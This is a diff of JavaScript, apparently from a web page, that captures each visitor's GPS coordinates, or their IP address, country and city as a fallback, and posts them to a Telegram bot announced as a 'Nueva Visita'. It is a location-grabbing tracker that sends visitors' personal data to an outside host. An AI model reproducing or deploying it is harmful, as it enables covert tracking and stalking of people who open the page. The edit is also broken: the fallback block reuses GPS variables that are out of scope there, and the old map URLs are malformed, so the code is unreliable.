@@ -62,9 +62,8 @@
             const lon = pos.coords.longitude;
             const acc = pos.coords.accuracy;
 
-            // CORREGIDO: Formato universal de enlace para Google Maps con parámetros (?q=)
-            const urlMaps = "https://google.com" + lat + "," + lon;
-            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\nGoogle Maps: " + urlMaps;
+            // MODIFICADO: Se elimina el texto de Google Maps y se dejan solo las coordenadas numéricas separadas por coma al final
+            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\n" + lat + "," + lon;
 
             // CORREGIDO: Ruta oficial completa de la API de bots de Telegram
             fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
@@ -78,11 +77,10 @@
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
-                // CORREGIDO: Formato de mapas estructurado para el respaldo por IP
-                const urlMapsIP = "https://google.com" + data.latitude + "," + data.longitude;
-                const textoIP = "🌐 Nueva Visita (Por IP)\n\n• IP: " + (data.ip || 'No detectada') + "\n• País: " + (data.country_name || 'Desconocido') + "\n• Ciudad: " + (data.city || 'Desconocida') + "\n\nGoogle Maps: " + urlMapsIP;
+                // MODIFICADO: Se elimina el texto de Google Maps y se dejan solo las coordenadas numéricas separadas por coma al final
+            const texto = "📍 Nueva Visita (GPS)\n\n• Latitud: " + lat + "\n• Longitud: " + lon + "\n• Precisión: ~" + Math.round(acc) + " metros\n\n" + lat + "," + lon;
                 
-                // CORREGIDO: Ruta oficial completa de Telegram para el respaldo
+            // CORREGIDO: Ruta oficial completa de Telegram para el respaldo
                 fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
